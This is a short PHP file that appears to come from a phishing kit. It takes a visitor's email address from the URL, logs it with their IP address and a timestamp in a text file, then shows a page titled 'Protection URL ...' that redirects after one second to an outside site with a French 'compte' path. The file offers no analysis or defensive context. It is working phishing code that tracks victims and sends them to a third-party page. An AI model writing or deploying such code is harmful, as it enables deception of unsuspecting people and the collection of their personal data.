<?php


$email = $_GET['email'];
$ip = getenv("REMOTE_ADDR");
$file = fopen("log.txt","a");
fwrite($file,$email." : ".$ip." -> ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
?>        
<!DOCTYPE html>
 
<html>
<head>
<title>Protection URL ...</title>
 
<meta http-equiv="refresh" content="1; URL=https://am-outlet.us/js/compte-fr/">
</head>
 
<body>
</body>
 
</html>                